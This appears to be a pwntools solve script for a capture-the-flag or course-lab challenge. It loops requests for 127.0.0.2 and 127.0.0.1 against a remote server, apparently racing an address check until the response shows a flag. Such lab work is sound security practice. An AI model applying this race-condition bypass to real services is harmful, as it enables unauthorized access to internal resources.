from pwn import remote


def solve(r: remote):
    msg = r.recvuntil(b"What do you want to do?").decode()
    print(msg)

    while True:
        r.sendline(b"g")
        r.sendline(b"127.0.0.2/10000")
        r.sendline(b"g")
        r.sendline(b"127.0.0.1/10000")
        r.recvuntil(b"What do you want to do?")
        r.recvuntil(b"What do you want to do?")

        r.sendline(b"v")
        msg = r.recvuntil(b"What do you want to do?").decode()
        if "FLAG" in msg:
            print(msg)
            break

    r.close()


if __name__ == "__main__":
    ## for remote access
    r = remote("up.zoolab.org", 10932)
    solve(r)
